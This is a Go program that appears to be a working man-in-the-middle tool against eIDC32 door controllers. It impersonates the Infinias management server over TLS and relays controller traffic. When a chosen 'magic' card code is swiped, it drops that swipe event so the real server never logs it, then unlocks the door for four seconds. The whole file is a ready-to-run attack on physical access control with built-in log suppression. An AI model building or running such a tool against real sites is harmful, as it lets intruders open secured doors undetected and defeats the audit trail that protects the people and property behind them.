package main

import (
	"crypto/rsa"
	"crypto/x509"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"time"

	"github.com/chrismarget/eidc32proxy"
)

const (
	sslPort  = 18800
)

type config struct {
	card []eidc32proxy.Card
}

func parseCardInfo(in string) (eidc32proxy.Card, error) {
	cardInfo := strings.Split(in, ":")
	if len(cardInfo) != 2 {
		return eidc32proxy.Card{}, fmt.Errorf("%s is not a valid card spec", in)
	}
	siteCode, err := strconv.Atoi(cardInfo[0])
	if err != nil {
		return eidc32proxy.Card{}, err
	}
	cardCode, err := strconv.Atoi(cardInfo[1])
	if err != nil {
		return eidc32proxy.Card{}, err
	}
	return eidc32proxy.Card{SiteCode: siteCode, CardCode: cardCode}, nil
}

func getConfig() (*config, error) {
	cards := flag.String("c", "", "card number in the form sitecode:cardcode,sitecode:cardcode,...")
	flag.Parse()
	config := &config{}
	for _, s := range strings.Split(*cards, ",") {
		card, err := parseCardInfo(s)
		if err != nil {
			return nil, err
		}
		config.card = append(config.card, card)
	}
	return config, nil
}

func goGoGadgetMagicCard() chan *eidc32proxy.Session {
	trigger := make(chan *eidc32proxy.Session)
	go func() {
		for s := range trigger {
			time.Sleep(100*time.Millisecond)
			log.Println("omg, so unlocking that door")
			err := s.SetLockStatus(eidc32proxy.Unlocked, true)
			if err != nil {
				log.Println(err)
			}
			time.Sleep(4 * time.Second)
			err = s.SetLockStatus(eidc32proxy.Locked, true)
			if err != nil {
				log.Println(err)
			}
			log.Println("relocking that door")
		}
	}()
	return trigger
}

func enrollMagicCard(card eidc32proxy.Card, s *eidc32proxy.Session, noisy bool) {
	//mcm := eidc32proxy.MasterKeyMangler{
	//	Card: card,
	//	Session: s,
	//	Log: log,
	//}
	filterFunc := func(request *eidc32proxy.EventRequest) bool {
		if request.CardCode != card.CardCode {
			return false
		}
		if request.SiteCode != card.SiteCode {
			return false
		}
		log.Println("mangler FilterFunc says: master key found")
		return true
	}

	doorStrikeChan := goGoGadgetMagicCard()

	postFunc := func(session *eidc32proxy.Session) error {
		log.Println("this is postFunc")
		doorStrikeChan <- s
		return nil
	}

	mcm := eidc32proxy.DropEidcEvent{
		FilterFunc: filterFunc,
		Session:    s,
		OneShot:    false,
		PostFunc:   postFunc,
	}
	s.AddMangler(mcm)
}

func doUnSub(unSubFuncs []func()) {
	for _, f := range unSubFuncs {
		f()
	}
}

func printFromChan(msgChan <-chan eidc32proxy.Message, out *os.File) func() {
	quitChan := make(chan struct{})
	quitFunc := func() { quitChan <- struct{}{} }
	go func() {
		for {
			select {
			case <-quitChan:
				return
			case msg := <-msgChan:
				printMe, err := msg.PrintableLines()
				if err != nil {
					log.Print(err)
				}
				for _, l := range printMe {
					_, err = out.WriteString(l)
					if err != nil {
						log.Print(err)
					}
				}
			}
		}
	}()
	return quitFunc
}

func main() {
	config, err := getConfig()
	if err != nil {
		log.Fatal(err)
	}

	var cert *x509.Certificate
	var key *rsa.PrivateKey

	// prepare TLS certificate and key we'll present to eIDC32 clients
	cert, key, err = eidc32proxy.CertAndKey(eidc32proxy.InfiniasCertSetup())
	if err != nil {
		log.Fatal(err)
	}

	// create a new SSL server using that cert and key
	server, err := eidc32proxy.NewServer(cert, key, nil)
	if err != nil {
		log.Fatal(err)
	}

	// start the server
	err = server.Serve(sslPort)
	if err != nil {
		log.Fatal(err)
	}

	controlC := make(chan os.Signal)
	signal.Notify(controlC, os.Interrupt, os.Kill)

	sessChan := server.SubscribeSessions()

	_ = config

	var unsubscribe []func()
	var stopPrinting func()
MAINLOOP:
	for {
		select {
		case s := <-sessChan: // new session has come up
			log.Println("------------NEW SESSION-----------")
			for _, c := range config.card {
				enrollMagicCard(c, s, true)
			}
			si := eidc32proxy.SubInfo{Category: eidc32proxy.SubMsgCatAny}
			msgChan, unSubFunc := s.Pager.Subscribe(si)
			unsubscribe = append(unsubscribe, unSubFunc)
			stopPrinting = printFromChan(msgChan, os.Stdout)
			//s.AddMangler(eidc32proxy.PrintMangler{})
			s.BeginRelaying()
		case <-controlC: // Stop channel says stop
			doUnSub(unsubscribe)
			stopPrinting()
			break MAINLOOP
		case err := <-server.ErrChan(): // server produced an error
			log.Println("SSL server Error:", err.Error())
			doUnSub(unsubscribe)
			stopPrinting()
			break MAINLOOP
		}
	}
	server.Stop()
}
